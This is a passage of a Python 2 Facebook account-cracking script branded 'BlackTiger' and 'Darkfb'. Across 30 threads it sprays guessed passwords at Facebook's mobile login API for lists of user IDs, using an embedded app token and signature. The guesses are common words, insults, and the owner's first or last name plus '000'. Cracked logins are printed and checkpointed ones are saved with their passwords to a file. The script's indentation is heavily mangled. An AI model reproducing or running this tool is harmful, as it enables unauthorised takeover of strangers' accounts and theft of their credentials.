                                                                                                                                                       else:
										                                                                           pass12 = 'Doraemon'					
										                                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                                           q = json.load(data)				
										                                                                           if 'access_token' in q:		
		                                                                                                                                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                                   z = json.loads(x.text)
											                                                                           print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass12 + '\n'
											                                                                           oks.append(user+pass12)
                                                                                                                                                           else:
			                                                                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass12 + '\n'
				                                                                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                                                                       cek.write("ID:" +user+ " Pw:" +pass12+"\n")
				                                                                                                                                       cek.close()
				                                                                                                                                       cekpoint.append(user+pass12)   
											                                                                           else:
										                                                                                       pass13 = 'Ganteng'					
										                                                                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                                                       q = json.load(data)				
										                                                                                       if 'access_token' in q:		
		                                                                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                                               z = json.loads(x.text)
											                                                                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass13 + '\n'
											                                                                                       oks.append(user+pass13)
                                                                                                                                                                       else:
			                                                                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass13 + '\n'
				                                                                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                                                                   cek.write("ID:" +user+ " Pw:" +pass13+"\n")
				                                                                                                                                                   cek.close()
				                                                                                                                                                   cekpoint.append(user+pass13)
                                                                                                                                                                               else:
										                                                          				           pass14 = 'Cinta'					
										                                                           				           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                            				           q = json.load(data)				
										                                                           				           if 'access_token' in q:		
		                                                                                                                                   				           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                            					           z = json.loads(x.text)
											                                                           				           print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                             					   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                            					   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                              					   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass14 + '\n'
											                                                            					   oks.append(user+pass14)
                                                                                                                                          				           else:
			                                                                                                                             				           if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                       				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                       					       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                      					       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                      					       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass14 + '\n'
				                                                                                                                       					       cek = open("out/super_cp.txt", "a")
				                                                                                                                        				       cek.write("ID:" +user+ " Pw:" +pass14+"\n")
				                                                                                                                       					       cek.close()
				                                                                                                                        				       cekpoint.append(user+pass14)
                                                                                                                                                         			           else:
										                                                                         				       pass15 = 'Terserah'					
										                                                                     					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                                       					       q = json.load(data)				
										                                                                        				       if 'access_token' in q:		
		                                                                                                                                               					       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                               					       z = json.loads(x.text)
											                                                                           				       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                                       					       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                                        				       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                                        				       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass15 + '\n'
											                                                                          				       oks.append(user+pass15)
                                                                                                                                                            				       else:
			                                                                                                                                            				       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                                     				           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                                   				           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                                    					   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                                    					   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass15 + '\n'
				                                                                                                                                   				           cek = open("out/super_cp.txt", "a")
				                                                                                                                                    					   cek.write("ID:" +user+ " Pw:" +pass15+"\n")
				                                                                                                                                    					   cek.close()
				                                                                                                                                     					   cekpoint.append(user+pass15)
                                                                       															       	       else:
										                                                            								   pass16 = 'Goblok'					
										                                                            								   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass16)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                            								   q = json.load(data)				
										                                                             								   if 'access_token' in q:		
		                                                                                                                                   						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                   							           z = json.loads(x.text)
											                                                            								   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                           							           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                             								   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                            								   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass16 + '\n'
											                                                         							           oks.append(user+pass16)
                                                                                                                                            								   else:
			                                                                                                                            								   if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                         							       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                        							       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                        							       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                         							       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass16 + '\n'
				                                                                                                                            							       cek = open("out/super_cp.txt", "a")
				                                                                                                                       								       cek.write("ID:" +user+ " Pw:" +pass16+"\n")
				                                                                                                                         							       cek.close()
				                                                                                                                         							       cekpoint.append(user+pass16)
                                                                                                                                                     								   else:
										                                                                  							               pass17 = 'Tolol'					
										                                                                       								       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                                      								       q = json.load(data)				
										                                                                       								       if 'access_token' in q:		
		                                                                                                                                              								       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                                							       z = json.loads(x.text)
											                                                                    								       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                                      								       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                                        							       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                                        							       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass17 + '\n'
											                                                                        							       oks.append(user+pass17)
                                                                                                                                                        							       else:
			                                                                                                                                        							       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                                    							           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                                     								   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                                    								   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                                   							           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass17 + '\n'
				                                                                                                                                    								   cek = open("out/super_cp.txt", "a")
				                                                                                                                                  							           cek.write("ID:" +user+ " Pw:" +pass17+"\n")
				                                                                                                                                  							           cek.close()
				                                                                                                                                   							           cekpoint.append(user+pass17)   
											                                                                          							       else:
										                                                                               								           pass18 = 'Jancok'					
										                                                                             								           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass18)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                                             								           q = json.load(data)				
										                                                                            								           if 'access_token' in q:		
		                                                                                                                                                						                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                               								                   z = json.loads(x.text)
											                                                                                							           print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                                               								           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                                              								           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                                                							           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass18 + '\n'
											                                                                                  							           oks.append(user+pass18)
                                                                                                                                                                      								   else:
			                                                                                                                                             								           if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                                     								               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                                   							                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                                        							               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                                                							       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass18 + '\n'
				                                                                                                                                               								       cek = open("out/super_cp.txt", "a")
				                                                                                                                                             								       cek.write("ID:" +user+ " Pw:" +pass18+"\n")
				                                                                                                                                            								       cek.close()
				                                                                                                                                          							               cekpoint.append(user+pass18)
                                                                                                                                                                         							           else:
										                                                          											               pass19 = b['first_name'] + '000'					
										                                                           										   	               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass19)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                            											               q = json.load(data)				
										                                                           				        							       if 'access_token' in q:		
		                                                                                                                                   											               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                            												               z = json.loads(x.text)
											                                                           				        							       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                             										      	               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                            									 			       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                              												       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass19 + '\n'
											                                                            	 											       oks.append(user+pass19)
                                                                                                                                          											               else:
			                                                                                                                             											               if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                       										 	                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                       											       	           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                      					      								   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                      					      								   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass19 + '\n'
				                                                                                                                       					     								   cek = open("out/super_cp.txt", "a")
				                                                                                                                        				      								   cek.write("ID:" +user+ " Pw:" +pass19+"\n")
				                                                                                                                       					      								   cek.close()
				                                                                                                                        				      								   cekpoint.append(user+pass19)
                                                                                                                                                         			         							       else:
										                                                                         				 							           pass20 = b['last_name'] + '000'					
										                                                                     											       	           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass20)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                                                       					      								   q = json.load(data)				
										                                                                        				      								   if 'access_token' in q:		
		                                                                                                                                               					      								   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                                                               					    								   z = json.loads(x.text)
											                                                                           				      								   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                                                       					     								   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                                                        				    								   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user
											                                                                        				    								   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass20 + '\n'
											                                                                          				     								   oks.append(user+pass20)
                                                                                                                                                            											           else:
			                                                                                                                                            											           if 'www.facebook.com' in q["error_msg"]:
				                                                                                                                                     				        							       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                                                   				     								       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                                                    											       	       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                                                    					 							       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass20 + '\n'
				                                                                                                                                   				         							       cek = open("out/super_cp.txt", "a")
				                                                                                                                                    					 							       cek.write("ID:" +user+ " Pw:" +pass20+"\n")
				                                                                                                                                    												       cek.close()
				                                                                                                                                     												       cekpoint.append(user+pass20)                 
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackTiger\033[1;92m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana Aahil--•◈•---»\n"
	print "\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;92m"+str(len(oks))+"\033[1;93m/\033[1;93m"+str(len(cekpoint))
	print """
 
 
\033[1;93mCheckpoint ID Terbuka Setelah 7 Hari
\033[1;92m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
 : \033[1;91m .....Creations Darkfb...... \033[1;92m :
\033[1;92m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•. 
                
              \033[1;91m """
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()
